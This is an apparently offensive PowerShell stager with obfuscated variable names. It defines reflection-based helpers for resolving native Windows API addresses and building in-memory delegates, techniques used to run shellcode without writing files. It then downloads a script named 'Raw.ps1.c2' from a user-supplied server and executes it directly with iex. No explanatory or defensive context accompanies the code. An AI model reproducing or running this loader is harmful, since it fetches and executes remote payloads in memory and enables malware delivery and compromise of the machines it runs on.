function Get-FunctionBaseAddress {
    Param ($jIbyTTEdfNkRSnxLLPxHLJfdGPvxreBLBLEQJ, $CPuKgDZpBRAsCrMeUVss)
    $PjuDxrjAnKfAbFwvoABfeWziaxmWxvHkCTMFzvnxxAFSH = ([AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $EvpYzMBCgqZkgjtxGCKuyDKmAlwiEdMbWBtTyCanevAx = $PjuDxrjAnKfAbFwvoABfeWziaxmWxvHkCTMFzvnxxAFSH.GetMethods() | ? { $_.Name -eq "GetProcAddress" }
    $aJHeYQnELMEvVcRWixcVdMbwyubDKSdYkJcpQMEwU = $EvpYzMBCgqZkgjtxGCKuyDKmAlwiEdMbWBtTyCanevAx[0].Invoke($null, ($PjuDxrjAnKfAbFwvoABfeWziaxmWxvHkCTMFzvnxxAFSH.GetMethod('GetModuleHandle').Invoke($null,@($jIbyTTEdfNkRSnxLLPxHLJfdGPvxreBLBLEQJ)), $CPuKgDZpBRAsCrMeUVss))
    return $aJHeYQnELMEvVcRWixcVdMbwyubDKSdYkJcpQMEwU
}
function Get-DelegateType {
    Param ([Type[]] $DzKOhnNuKRUYuekToZFWbV, [Type] $wEVRQwVnRbXGyCVYfiTSzuzwEd = [Void] )
    $GzqOBbKfuvNJKyFxRGTKlHcfy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
    $GzqOBbKfuvNJKyFxRGTKlHcfy.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $DzKOhnNuKRUYuekToZFWbV).SetImplementationFlags('Runtime, Managed')
    $GzqOBbKfuvNJKyFxRGTKlHcfy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $wEVRQwVnRbXGyCVYfiTSzuzwEd, $DzKOhnNuKRUYuekToZFWbV).SetImplementationFlags('Runtime, Managed')
    return $GzqOBbKfuvNJKyFxRGTKlHcfy.CreateType()
}
[string]::IsNullOrEmpty($prefixpath) -and ($prefixpath = Read-Host "Specify prefixpathUrl")
$wbc = New-Object System.Net.WebClient
$wbc.Encoding = [System.Text.Encoding]::UTF8
$wbc.DownloadString("$prefixpath/Raw.ps1.c2") | iex
